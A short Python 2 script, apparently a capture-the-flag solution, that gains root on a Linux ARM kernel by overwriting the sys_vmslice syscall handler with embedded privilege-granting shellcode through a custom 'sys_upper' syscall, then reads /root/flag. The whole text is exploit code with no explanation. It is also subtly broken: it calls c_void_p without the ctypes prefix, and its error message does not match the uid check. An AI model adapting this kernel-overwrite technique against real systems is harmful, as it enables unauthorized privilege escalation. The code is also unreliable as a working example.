import ctypes

SYS_UPPER   = 223
OVERWRITTEN = 343

libc = ctypes.CDLL("libc.so.6")

grant_privs = "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x01\xb5\x92\x1a" + \
              "\x10\x1c\xf0\x46\x02\x4a\x90\x47\x02\x4a\x1c\x32" + \
              "\x90\x47\x01\xbd\x24\xf9\x03\x80\x50\xf5\x03\x80"
              
print "[+] Overwriting sys_vmslice..."

sys_vmslice = c_void_p(0x800e3dc8)

#call sys_upper to overwrite vmslice then call the new code
libc.syscall(SYS_UPPER, grant_privs, sys_vmslice)
libc.syscall(OVERWRITTEN)

#bail if we are not uid 0 (root)
if libc.getuid() != 0:
	print "[!] Error while opening the flag file"

else:
	print "[+] Got r00t"
	flag = open("/root/flag").read()
	
	print "[*] Flag: %s" % flag.strip()
